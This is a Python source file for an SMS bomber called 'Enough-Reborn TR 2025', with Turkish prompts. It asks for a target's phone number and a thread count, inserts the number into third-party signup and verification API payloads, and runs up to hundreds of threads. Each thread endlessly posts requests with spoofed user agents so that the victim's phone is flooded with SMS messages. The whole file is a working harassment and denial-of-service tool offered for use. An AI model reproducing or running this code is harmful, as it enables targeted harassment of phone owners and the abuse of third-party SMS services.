# enough.py - Enough-Reborn TR 2025
import requests, threading, random, time, sys, os
from colorama import init, Fore
from tqdm import tqdm
from fake_useragent import UserAgent
from sms import api_list

init(autoreset=True)
ua = UserAgent()
os.system("clear" if "linux" in sys.platform else "cls")

print(f"""{Fore.RED}
███████╗███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ ██╗  ██╗
██╔════╝████╗  ██║██╔═══██╗██║   ██║██╔══██╗██║  ██║
█████╗  ██╔██╗ ██║██║   ██║██║   ██║███████║███████║
██╔══╝  ██║╚██╗██║██║   ██║██║   ██║██╔══██║██╔══██║
███████╗██║ ╚████║╚██████╔╝╚██████╔╝██║  ██║██║  ██║
╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.WHITE} REBORN TR 2025
""")

def temizle(no):
    no = str(no).replace(" ","").replace("-","").replace("(","").replace(")","").replace("+","")
    return "90"+no[1:] if no.startswith("0") else "90"+no if not no.startswith("90") else no

tel = temizle(input(f"{Fore.YELLOW}[?] Hedef numara: {Fore.WHITE}"))
thread_sayisi = int(input(f"{Fore.YELLOW}[?] Thread (50-200): {Fore.WHITE}") or "120")

for api in api_list:
    for key in api["json"]:
        if "phone" in key.lower() or "mobile" in key.lower() or "msisdn" in key.lower():
            api["json"][key] = tel if "msisdn" in key else tel[2:]

sayac = 0
lock = threading.Lock()

def saldir():
    global sayac
    while True:
        try:
            api = random.choice(api_list)
            requests.post(api["url"], json=api["json"], headers={"User-Agent": ua.random}, timeout=7)
            with lock: sayac += 1
        except: pass

print(f"{Fore.GREEN}[+] {tel} patlatılıyor... {thread_sayisi} thread açılıyor!")
for i in tqdm(range(thread_sayisi), desc="Thread", colour="red"):
    threading.Thread(target=saldir, daemon=True).start()

try:
    while True:
        time.sleep(0.5)
        print(f"\r{Fore.RED}[{sayac}]{Fore.GREEN} SMS GİTTİ → {tel} 🔥", end="")
except KeyboardInterrupt:
    print(f"\n\n{Fore.RED}Yeter dedin piç! Toplam {sayac} SMS gitti.")
    exit()